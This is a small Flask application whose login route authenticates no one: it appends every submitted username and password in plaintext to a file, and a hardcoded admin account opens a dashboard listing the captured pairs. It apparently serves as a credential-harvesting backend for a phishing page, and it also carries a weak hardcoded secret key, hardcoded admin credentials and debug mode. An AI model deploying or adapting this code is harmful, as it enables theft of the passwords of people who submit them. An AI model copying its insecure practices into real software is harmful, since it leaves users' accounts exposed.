from flask import Flask, request, render_template, redirect, session

app = Flask(__name__)
app.secret_key = "secret123"

ADMIN_USER = "admin"
ADMIN_PASS = "admin123"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    with open("data.txt", "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")

    return "User Data Saved!"

@app.route('/admin')
def admin():
    return render_template('admin_login.html')

@app.route('/admin_login', methods=['POST'])
def admin_login():
    user = request.form['username']
    pwd = request.form['password']

    if user == ADMIN_USER and pwd == ADMIN_PASS:
        session['admin'] = True
        return redirect('/dashboard')
    else:
        return "Wrong Admin Credentials"

@app.route('/dashboard')
def dashboard():
    if 'admin' in session:
        with open("data.txt", "r") as f:
            data = f.readlines()
        return render_template('dashboard.html', data=data)
    else:
        return redirect('/admin')

@app.route('/logout')
def logout():
    session.pop('admin', None)
    return redirect('/admin')

if __name__ == '__main__':
    app.run(debug=True)